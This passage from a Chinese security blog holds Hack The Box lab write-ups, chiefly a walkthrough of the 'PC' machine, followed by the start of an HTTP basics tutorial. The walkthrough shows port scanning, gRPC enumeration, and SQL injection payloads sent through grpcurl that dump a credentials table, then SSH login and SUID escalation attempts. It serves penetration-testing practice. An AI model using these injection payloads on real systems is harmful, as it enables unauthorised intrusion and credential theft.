<p>marcus@monitorstwo:~$ ls -la &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged<br>total 108<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 .<br>drwx—–x 5 root root  4096 Jun 21 15:30 ..<br>drwxr-xr-x 1 root root  4096 Mar 22 13:21 bin<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 boot<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 dev<br>-rwxr-xr-x 1 root root     0 Mar 21 10:49 .dockerenv<br>-rwxr-xr-x 1 root root     0 Jan  5 11:37 entrypoint.sh<br>drwxr-xr-x 1 root root  4096 Mar 21 10:49 etc<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 home<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 lib<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 lib64<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 media<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 mnt<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 opt<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 proc<br>drwx—— 1 root root  4096 Mar 21 10:50 root<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 run<br>drwxr-xr-x 1 root root  4096 Jan  9 09:30 sbin<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 srv<br>drwxr-xr-x 2 root root  4096 Mar 22 13:21 sys<br>drwxrwxrwt 1 root root 20480 Jun 21 16:14 tmp<br>drwxr-xr-x 1 root root  4096 Nov 14  2022 usr<br>drwxr-xr-x 1 root root  4096 Nov 15  2022 var</p>
</blockquote>
<h3 id="6-x2F-bin-x2F-bash-p"><a href="#6-x2F-bin-x2F-bash-p" class="headerlink" title="6.  .&#x2F;bin&#x2F;bash -p"></a>6.  .&#x2F;bin&#x2F;bash -p</h3><blockquote>
<p>marcus@monitorstwo:~$ ls -la &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash<br>-rwxr-xr-x 1 root root 1234376 Mar 27  2022 &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash</p>
</blockquote>
<blockquote>
<p>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1&#x2F;merged&#x2F;bin&#x2F;bash -p</p>
</blockquote>
<blockquote>
<p>marcus@monitorstwo:~$ cd &#x2F;root<br>bash: cd: &#x2F;root: Permission denied</p>
</blockquote>
<p>-p命令执行没效果。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>找到cms版本漏洞，使用已存在的漏洞进行攻击，通过监听拿到shell。</p>
<h2 id="4-PC"><a href="#4-PC" class="headerlink" title="4.PC"></a>4.PC</h2><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_64201116/article/details/130940490">HTB PC_清风–的博客-CSDN博客</a></p>
<p>[htb pc wp_春猿火的博客-CSDN博客](<a href="https://blog.csdn.net/m0_56308852/article/details/131020148?ops_request_misc=%7B%22request_id%22:%22168751647616800213092172%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168751647616800213092172&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-131020148-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=htb">https://blog.csdn.net/m0_56308852/article/details/131020148?ops_request_misc=%7B%22request%5Fid%22%3A%22168751647616800213092172%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168751647616800213092172&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-3-131020148-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=htb</a> pc&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h3 id="1-扫描端口-1"><a href="#1-扫描端口-1" class="headerlink" title="1.扫描端口"></a>1.扫描端口</h3><p>默认扫描只扫到了22端口，试试全端口扫描</p>
<p><code>nmap -p0-65535 10.10.11.214</code></p>
<blockquote>
<p>22&#x2F;tcp    open  ssh<br>50051&#x2F;tcp open  unknown</p>
</blockquote>
<h3 id="2-未知端口50051"><a href="#2-未知端口50051" class="headerlink" title="2.未知端口50051"></a>2.未知端口50051</h3><p>搜索引擎搜一下，说是grpc的默认端口为50051</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230623140547228.png"></p>
<blockquote>
<p>Google远程过程调用（Google Remote Procedure Call，gRPC）是基于HTTP 2.0传输层协议承载的高性能开源RPC软件框架，为管理和配置网络设备提供了一种API接口设计的方法。gRPC提供了多种编程语言，如C、Java、golong、python等。<br>gRPC可以作为数据传输协议与Telemetry技术配合使用，可实时、高速、精确的监控网络设备的运行状态。此外，网络设备提供了一种基于gRPC方式来管理设备的方法，包括配置、查询和能力获取三种方法。这些方法是通过设备和采集器对接，实现采集设备数据的功能。</p>
</blockquote>
<p><a href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcui</a></p>
<p>下载链接工具。 但是要go环境。</p>
<h4 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h4><p>那就找docker的</p>
<p><code>docker pull fullstorydev/grpcurl:latest</code></p>
<p>启动</p>
<p><code>docker run fullstorydev/grpcurl -plaintext 10.10.11.214:50051  </code>  </p>
<p>少了参数。</p>
<p>-help</p>
<p>然后出现以下帮助</p>
<blockquote>
<p>Usage:<br>        &#x2F;bin&#x2F;grpcurl [flags] [address] [list|describe] [symbol]</p>
<p>The ‘address’ is only optional when used with ‘list’ or ‘describe’ and a<br>protoset or proto flag is provided.</p>
<p>If ‘list’ is indicated, the symbol (if present) should be a fully-qualified<br>service name. If present, all methods of that service are listed. If not<br>present, all exposed services are listed, or all services defined in protosets.</p>
<p>If ‘describe’ is indicated, the descriptor for the given symbol is shown. The<br>symbol should be a fully-qualified service, enum, or message name. If no symbol<br>is given then the descriptors for all exposed or known services are shown.</p>
<p>If neither verb is present, the symbol must be a fully-qualified method name in<br>‘service&#x2F;method’ or ‘service.method’ format. In this case, the request body will<br>be used to invoke the named method. If no body is given but one is required<br>(i.e. the method is unary or server-streaming), an empty instance of the<br>method’s request type will be sent.</p>
<p>The address will typically be in the form “host:port” where host can be an IP<br>address or a hostname and port is a numeric port or service name. If an IPv6<br>address is given, it must be surrounded by brackets, like “[2001:db8::1]”. For<br>Unix variants, if a -unix&#x3D;true flag is present, then the address must be the<br>path to the domain socket.</p>
<p>Available flags:<br>  -H value<br>        Additional headers in ‘name: value’ format. May specify more than one<br>        via multiple flags. These headers will also be included in reflection<br>        requests to a server.<br>  -allow-unknown-fields<br>        When true, the request contents, if ‘json’ format is used, allows<br>        unknown fields to be present. They will be ignored when parsing<br>        the request.<br>  -authority string<br>        The authoritative name of the remote server. This value is passed as the<br>        value of the “:authority” pseudo-header in the HTTP&#x2F;2 protocol. When TLS<br>        is used, this will also be used as the server name when verifying the<br>        server’s certificate. It defaults to the address that is provided in the<br>        positional arguments.<br>  -cacert string<br>        File containing trusted root certificates for verifying the server.<br>        Ignored if -insecure is specified.<br>  -cert string<br>        File containing client certificate (public key), to present to the<br>        server. Not valid with -plaintext option. Must also provide -key option.<br>  -connect-timeout float<br>        The maximum time, in seconds, to wait for connection to be established.<br>        Defaults to 10 seconds.<br>  -d string<br>        Data for request contents. If the value is ‘@’ then the request contents<br>        are read from stdin. For calls that accept a stream of requests, the<br>        contents should include all such request messages concatenated together<br>        (possibly delimited; see -format).<br>  -emit-defaults<br>        Emit default values for JSON-encoded responses.<br>  -expand-headers<br>        If set, headers may use ‘${NAME}’ syntax to reference environment<br>        variables. These will be expanded to the actual environment variable<br>        value before sending to the server. For example, if there is an<br>        environment variable defined like FOO&#x3D;bar, then a header of<br>        ‘key: ${FOO}’ would expand to ‘key: bar’. This applies to -H,<br>        -rpc-header, and -reflect-header options. No other expansion&#x2F;escaping is<br>        performed. This can be used to supply credentials&#x2F;secrets without having<br>        to put them in command-line arguments.<br>  -format string<br>        The format of request data. The allowed values are ‘json’ or ‘text’. For<br>        ‘json’, the input data must be in JSON format. Multiple request values<br>        may be concatenated (messages with a JSON representation other than<br>        object must be separated by whitespace, such as a newline). For ‘text’,<br>        the input data must be in the protobuf text format, in which case<br>        multiple request values must be separated by the “record separator”<br>        ASCII character: 0x1E. The stream should not end in a record separator.<br>        If it does, it will be interpreted as a final, blank message after the<br>        separator. (default “json”)<br>  -format-error<br>        When a non-zero status is returned, format the response using the<br>        value set by the -format flag .<br>  -help<br>        Print usage instructions and exit.<br>  -import-path value<br>        The path to a directory from which proto sources can be imported, for<br>        use with -proto flags. Multiple import paths can be configured by<br>        specifying multiple -import-path flags. Paths will be searched in the<br>        order given. If no import paths are given, all files (including all<br>        imports) must be provided as -proto flags, and grpcurl will attempt to<br>        resolve all import statements from the set of file names given.<br>  -insecure<br>        Skip server certificate and domain verification. (NOT SECURE!) Not<br>        valid with -plaintext option.<br>  -keepalive-time float<br>        If present, the maximum idle time in seconds, after which a keepalive<br>        probe is sent. If the connection remains idle and no keepalive response<br>        is received for this same period then the connection is closed and the<br>        operation fails.<br>  -key string<br>        File containing client private key, to present to the server. Not valid<br>        with -plaintext option. Must also provide -cert option.<br>  -max-msg-sz int<br>        The maximum encoded size of a response message, in bytes, that grpcurl<br>        will accept. If not specified, defaults to 4,194,304 (4 megabytes).<br>  -max-time float<br>        The maximum total time the operation can take, in seconds. This is<br>        useful for preventing batch jobs that use grpcurl from hanging due to<br>        slow or bad network links or due to incorrect stream method usage.<br>  -msg-template<br>        When describing messages, show a template of input data.<br>  -plaintext<br>        Use plain-text HTTP&#x2F;2 when connecting to server (no TLS).<br>  -proto value<br>        The name of a proto source file. Source files given will be used to<br>        determine the RPC schema instead of querying for it from the remote<br>        server via the gRPC reflection API. When set: the ‘list’ action lists<br>        the services found in the given files and their imports (vs. those<br>        exposed by the remote server), and the ‘describe’ action describes<br>        symbols found in the given files. May specify more than one via multiple<br>        -proto flags. Imports will be resolved using the given -import-path<br>        flags. Multiple proto files can be specified by specifying multiple<br>        -proto flags. It is an error to use both -protoset and -proto flags.<br>  -protoset value<br>        The name of a file containing an encoded FileDescriptorSet. This file’s<br>        contents will be used to determine the RPC schema instead of querying<br>        for it from the remote server via the gRPC reflection API. When set: the<br>        ‘list’ action lists the services found in the given descriptors (vs.<br>        those exposed by the remote server), and the ‘describe’ action describes<br>        symbols found in the given descriptors. May specify more than one via<br>        multiple -protoset flags. It is an error to use both -protoset and<br>        -proto flags.<br>  -protoset-out string<br>        The name of a file to be written that will contain a FileDescriptorSet<br>        proto. With the list and describe verbs, the listed or described<br>        elements and their transitive dependencies will be written to the named<br>        file if this option is given. When invoking an RPC and this option is<br>        given, the method being invoked and its transitive dependencies will be<br>        included in the output file.<br>  -reflect-header value<br>        Additional reflection headers in ‘name: value’ format. May specify more<br>        than one via multiple flags. These headers will <em>only</em> be used during<br>        reflection requests and will be excluded when invoking the requested RPC<br>        method.<br>  -rpc-header value<br>        Additional RPC headers in ‘name: value’ format. May specify more than<br>        one via multiple flags. These headers will <em>only</em> be used when invoking<br>        the requested RPC method. They are excluded from reflection requests.<br>  -servername string<br>        Override server name when validating TLS certificate. This flag is<br>        ignored if -plaintext or -insecure is used.<br>        NOTE: Prefer -authority. This flag may be removed in the future. It is<br>        an error to use both -authority and -servername (though this will be<br>        permitted if they are both set to the same value, to increase backwards<br>        compatibility with earlier releases that allowed both to be set).<br>  -unix<br>        Indicates that the server address is the path to a Unix domain socket.<br>  -use-reflection<br>        When true, server reflection will be used to determine the RPC schema.<br>        Defaults to true unless a -proto or -protoset option is provided. If<br>        -use-reflection is used in combination with a -proto or -protoset flag,<br>        the provided descriptor sources will be used in addition to server<br>        reflection to resolve messages and extensions.<br>  -user-agent string<br>        If set, the specified value will be added to the User-Agent header set<br>        by the grpc-go library.<br>  -v    Enable verbose output.<br>  -version<br>        Print version.<br>  -vv<br>        Enable very verbose output.</p>
</blockquote>
<p>&#x2F;&#x2F;list</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 list<br>SimpleApp<br>grpc.reflection.v1alpha.ServerReflection</p>
</blockquote>
<p>&#x2F;&#x2F;describe查看</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp<br>SimpleApp is a service:<br>service SimpleApp {<br>  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );<br>  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );<br>  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;查看注册请求方法</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest<br>RegisterUserRequest is a message:<br>message RegisterUserRequest {<br>  string username &#x3D; 1;<br>  string password &#x3D; 2;<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;注册一下</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“username”:”123”,”password”:”123”}’ 10.10.11.214:50051 SimpleApp.RegisterUser<br>{<br>  “message”: “username or password must be greater than 4”<br>}</p>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“username”:”1234”,”password”:”1234”}’ 10.10.11.214:50051 SimpleApp.RegisterUser<br>{<br>  “message”: “Account created for user 1234!”<br>}</p>
</blockquote>
<p>&#x2F;&#x2F;登录</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext  -v -d ‘{“username”:”1234”,”password”:”1234”}’ 10.10.11.214:50051 SimpleApp.LoginUser</p>
<p>&#x2F;&#x2F; -v是详细信息，后面有用的到的token</p>
<p>Resolved method descriptor:<br>rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );</p>
<p>Request metadata to send:<br>(empty)</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “Your id is 842.”<br>}</p>
<p>Response trailers received:<br>token: b’eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM’<br>Sent 1 request and received 1 response</p>
</blockquote>
<p>&#x2F;&#x2F;getinfo</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -d ‘{“id”:”728”}’ 10.10.11.214:50051 SimpleApp.getInfo<br>{<br>  “message”: “Authorization Error.Missing ‘token’ header”<br>}</p>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”842”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo</p>
<p>Resolved method descriptor:<br>rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</p>
<p>Request metadata to send:<br>token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “Will update soon.”<br>}</p>
<p>Response trailers received:<br>(empty)<br>Sent 1 request and received 1 response</p>
</blockquote>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”1’”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo<br>dquote&gt; </p>
</blockquote>
<p>好，使用了go环境跑grpcui的大佬，是通过bp抓包，sqlmap得到，数据库是sqlite，密码为HereIsYourPassWord1431，用户名sau。</p>
<blockquote>
<p>└─# docker run fullstorydev&#x2F;grpcurl -plaintext -v -d ‘{“id”:”1 union select 1”}’ -H “token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM” 10.10.11.214:50051 SimpleApp.getInfo</p>
<p>Resolved method descriptor:<br>rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );</p>
<p>Request metadata to send:<br>token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM</p>
<p>Response headers received:<br>content-type: application&#x2F;grpc<br>grpc-accept-encoding: identity, deflate, gzip</p>
<p>Response contents:<br>{<br>  “message”: “1”<br>}</p>
<p>Response trailers received:<br>(empty)<br>Sent 1 request and received 1 response</p>
</blockquote>
<p>百度了下sqlite的语法</p>
<blockquote>
<p>SELECT type, name, tbl_name, rootpage, sql FROM sqlite_master WHERE type&#x3D;’table’;</p>
</blockquote>
<p><code>docker run fullstorydev/grpcurl -plaintext -v -d &#39;&#123;&quot;id&quot;:&quot;1 union select sql from sqlite_master where type=\&quot;table\&quot;&quot;&#125;&#39; -H &quot;token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM&quot; 10.10.11.214:50051 SimpleApp.getInfo</code></p>
<blockquote>
<p>…</p>
<p>Response contents:<br>{<br>  “message”: “CREATE TABLE &quot;accounts&quot; (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)”<br>}</p>
</blockquote>
<p>有一个accounts表，字段为username和password</p>
<p><code>docker run fullstorydev/grpcurl -plaintext -v -d &#39;&#123;&quot;id&quot;:&quot;1 union select group_concat(username||\&quot;~\&quot;||password) from accounts&quot;&#125;&#39; -H &quot;token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMTIzNCIsImV4cCI6MTY4NzUxNjg1OH0.wCduAv88qr8Y4aqHASQAvSlMpdF73NnOM2m9EnaedHM&quot; 10.10.11.214:50051 SimpleApp.getInfo</code></p>
<blockquote>
<p><code>||</code>符号通常用作字符串连接运算符，用于将两个字符串连接在一起。它在许多关系型数据库管理系统（包括SQLite）中都被广泛支持，跨数据库通用。用逗号这里貌似出错了。</p>
</blockquote>
<blockquote>
<p>Response contents:<br>{<br>  “message”: “admin<del>admin,sau</del>HereIsYourPassWord1431”<br>}</p>
</blockquote>
<h3 id="3-ssh连接-1"><a href="#3-ssh连接-1" class="headerlink" title="3.ssh连接"></a>3.ssh连接</h3><p> <code>ssh sau@10.10.11.214</code> </p>
<blockquote>
<p> cat user.txt</p>
</blockquote>
<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h3><p>sudo -l提权</p>
<blockquote>
<p>sau@pc:~$ sudo -l<br>[sudo] password for sau:<br>Sorry, user sau may not run sudo on localhost.</p>
</blockquote>
<p>suid提权</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<blockquote>
<p>用于查找具有 SetUID 权限的可执行文件</p>
<ul>
<li><p><code>find</code>：这是一个用于在文件系统中搜索文件和目录的命令。</p>
</li>
<li><p><code>/</code>：表示搜索的起始位置为根目录。</p>
</li>
<li><p><code>-perm -u=s</code>：这是<code>find</code>命令的选项之一。<code>-perm</code>用于匹配文件的权限，<code>-u=s</code>表示匹配具有 SetUID 权限的文件。</p>
</li>
<li><p><code>-type f</code>：这是<code>find</code>命令的另一个选项，指定要搜索的文件类型为普通文件。</p>
</li>
<li><p><code>2&gt;/dev/null</code>：将标准错误输出重定向到 <code>/dev/null</code>，这样可以隐藏权限错误信息。</p>
<p>通常，SetUID 权限用于以文件所有者的权限而不是执行者的权限来执行文件。</p>
</li>
</ul>
</blockquote>
<p>发现了一个**&#x2F;usr&#x2F;bin&#x2F;bash**</p>
<p><code>/usr/bin/bash -p</code></p>
<p>按理说这样就可以是root身份了。</p>
<p>奇怪，我还是没反应，whoami不是root。</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>搜索未知端口的服务入手。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>渗透测试</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>http与xss</title>
    <url>/2023/06/10/http%E4%B8%8Exss/</url>
    <content><![CDATA[<h1 id="一、web安全基础"><a href="#一、web安全基础" class="headerlink" title="一、web安全基础"></a>一、web安全基础</h1><h2 id="1-web应用"><a href="#1-web应用" class="headerlink" title="1.web应用"></a>1.web应用</h2><h3 id="1-HTTP请求与响应"><a href="#1-HTTP请求与响应" class="headerlink" title="1.HTTP请求与响应"></a>1.HTTP请求与响应</h3><p>（PC）访问网址-&gt;发起请求（HTTP请求包头结构）-&gt;（服务器）接收并回应请求-&gt;HTTP响应-&gt;（HTTP响应包头结构）-&gt;得到页面</p>
<p>请求包与响应包不陌生了，bp抓一下就有。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616203032474.png" alt="信息查询功能流程"></p>
<p>1）Web应用不一定为用户可见页面，比如各类API接口，其原理是一个Web页面，并对用户请求的内容进行处理。</p>
<p>2）Web应用不一定要依托浏览器才能使用，例如，爬虫脚本的数据获取部分，只要能构造HTTP Request包即可开展对Web应用数据的获取。</p>
<p>3）并不一定需要标准的Web中间件，直接利用编程语言编写对应处理规则也可实现对用户请求的处理，但处理的过程就是中间件本来该执行的工作。</p>
<h3 id="2-web应用环境"><a href="#2-web应用环境" class="headerlink" title="2.web应用环境"></a>2.web应用环境</h3><p>Web应用需要一台服务器提供基础资源，可运行操作系统，并配合中间件来为用户提供服务。如果站点功能较为复杂，那么还需要用数据库提供基础的数据存储支持，用文件服务器进行备份，用SAN系统提供高性能的文件存储等。在这个过程中，任何一个环节出现问题，都可能导致Web安全问题出现。</p>
<h3 id="3-交互"><a href="#3-交互" class="headerlink" title="3.交互"></a>3.交互</h3><p>HTTP协议作为Web应用的基础协议，其特点就是用户请求–服务器响应。在这个过程中，服务器一直处于被动响应状态，无法主动获取用户的信息。再看一下HTML结构，服务器在完成用户响应后，当前的HTML页面会被发送到用户端的浏览器，这也就决定了客户端拥有HTML的全部结构及内容。基于这种交换环境，在客户端可篡改任何请求参数，服务器必须对请求内容进行响应。这也就决定了Web最核心的问题，用户端的所有行为均不可信。</p>
<h2 id="2-Http协议"><a href="#2-Http协议" class="headerlink" title="2.Http协议"></a>2.Http协议</h2><h3 id="1-定义与特点"><a href="#1-定义与特点" class="headerlink" title="1.定义与特点"></a>1.定义与特点</h3><p>HTTP是一个应用层的面向对象的协议</p>
<blockquote>
<p>其特点有三：</p>
<ol>
<li>无状态，客户端发起请求-&gt;服务端响应-&gt;发出新请求，每次请求均为独立行为，体现了HTTP无状态特点</li>
<li>支持B&#x2F;S模式，有浏览器即可工作，用户可上手易于操作</li>
<li>灵活性好，数据传输、视频播放、交互</li>
</ol>
</blockquote>
<h3 id="2-HTTP请求内容"><a href="#2-HTTP请求内容" class="headerlink" title="2.HTTP请求内容"></a>2.HTTP请求内容</h3><p>HTTP请求由三部分组成，分别是请求行、消息报头、请求正文。</p>
<blockquote>
<p>GET &#x2F;ad&#x2F;json&#x2F;integrate&#x2F;list?positions&#x3D;932 HTTP&#x2F;1.1<br><strong>Host</strong>: kunpeng.csdn.net<br>Connection: close<br>sec-ch-ua: “Chromium”;v&#x3D;”112”, “Google Chrome”;v&#x3D;”112”, “Not:A-Brand”;v&#x3D;”99”<br><strong>Accept:</strong> application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01<br><strong>Content-Type</strong>: application&#x2F;x-www-form-urlencoded; charset&#x3D;utf-8<br>sec-ch-ua-mobile: ?0<br><strong>User-Agent</strong>: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;112.0.0.0 Safari&#x2F;537.36<br>sec-ch-ua-platform: “Windows”<br><strong>Origin</strong>: <a href="https://www.csdn.net/">https://www.csdn.net</a><br>Sec-Fetch-Site: same-site<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Dest: empty<br><strong>Referer</strong>: <a href="https://www.csdn.net/">https://www.csdn.net/</a><br><strong>Accept-Encoding</strong>: gzip, deflate<br><strong>Accept-Language</strong>: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Cookie: uuid_tt_dd&#x3D;10_37087154240-1640528249…..</p>
</blockquote>
<p><strong>1.请求行</strong></p>
<p>标准的请求行格式为：</p>
<blockquote>
<p>请求方法 请求URI 协议版本 回车换行</p>
</blockquote>
<p>嗯，就bp抓包时的第一行</p>
<p><strong>请求方法统计一下</strong></p>
<blockquote>
<p>·GET　请求获取Request-URI所标识的资源。</p>
<p>·POST　在Request-URI所标识的资源后附加新的数据。</p>
<p>·HEAD　请求获取由Request-URI所标识的资源的响应消息报头。</p>
<p>·PUT　请求服务器存储一个资源，并用Request-URI作为其标识。</p>
<p>·DELETE　请求服务器删除Request-URI所标识的资源。</p>
<p>·TRACE　请求服务器回送收到的请求信息，主要用于测试或诊断。</p>
<p>·CONNECT　保留，将来使用。</p>
<p>·OPTIONS　请求查询服务器的性能，或者查询与资源相关的选项和需求。</p>
<p>在实际应用中，考虑到安全因素，主要使用GET和POST两种方式开展请求。例如，早期ASP系统中存在大量IIS PUT漏洞，导致攻击者可直接利用PUT工具上传木马以获得Webshell。因此，从安全及业务开展统一的角度，其余方式目前基本都不再使用。</p>
<p>GET和POST在使用中的主要区别为：</p>
<p>·GET方法　通过在浏览器的地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，对应的请求行示例为：GET&#x2F;form.html HTTP&#x2F;1.1（CRLF）。</p>
<p>·POST方法　要求被请求服务器接收附在请求后面的数据，常用于提交表单。</p>
</blockquote>
<p><strong>2.消息报头</strong></p>
<blockquote>
<p>·Host（必须存在）：Host主要用于指定被请求资源的Internet主机和端口号，即标识请求目标。其来源为当前访问的URL。缺省端口号为80，若指定了端口号（以8000为例）进行防卫，则变成Host： kunpeng.csdn.net:8000。</p>
<p>·Content-Length：标识当前请求包中的内容长度。</p>
<p>·Origin：用来标识本次请求的发起源，只适用于POST方式。</p>
<p>·Referer：用来标识当前请求的发起页面。</p>
<p>·Accept：Accept用于指定客户端接收哪些类型的信息。上例中表明允许后续类型在客户端实现。</p>
<p>·Accept-Encoding：告知服务器端当前客户端可接受的内容编码。</p>
<p>·Accept-Language：告知服务器端支持的语言类型。</p>
<p>·User-Agent：User-Agent通常简称为UA，其中包含当前用户的操作系统、浏览器的基本信息，用于告知Web服务器当前访问者的情况。此报头域不是必需存在的。但如果客户端不使用User-Agent请求报头域，那么服务器端就无法得知客户端的基本信息。目前UA也经常被Web服务器用于统计当前用户状态及行为。</p>
</blockquote>
<p><strong>3.请求正文</strong></p>
<blockquote>
<p>Sec-Fetch-Dest: document<br>Referer: <a href="http://localhost:81/7/1.html">http://localhost:81/7/1.html</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Connection: close</p>
<p><strong>username&#x3D;123&amp;pwd&#x3D;546&amp;%26%2365533%3B%26%2365533%3B%E4%BA%26%2365533%3B&#x3D;%C4%F3%B8%F2</strong></p>
<p>黑粗体部分为请求正文内容</p>
</blockquote>
<p>注意，get请求没有这一项，因为在url就包含了</p>
<p>当然了，防止攻击的话，post的请求参数不要这么大众化。</p>
<h3 id="3-HTTP响应内容"><a href="#3-HTTP响应内容" class="headerlink" title="3.HTTP响应内容"></a>3.HTTP响应内容</h3><p>响应行、响应消息报头、响应正文</p>
<p>重点说下常见的响应消息报头：</p>
<blockquote>
<p>·Server　Server响应报头域包含服务器用来处理请求的软件信息。参考图1-6，其中定义了Server：Apache，用来告知用户端提供本次响应的服务器端采用的中间件是Apache。可以看到，在响应包中Server信息与请求包中User-Agent信息的作用非常类似，都是将自身的版本告知对方。</p>
<p>·X-Powered-By　用来标识实现当前Web站点所采用的语言及版本号。</p>
<p>·Set-cookie　根据响应包生成Cookie，并提供给客户端。</p>
<p>·Content-Length　与请求包中的用法相同，用以标识当前响应包中的内容长度。</p>
</blockquote>
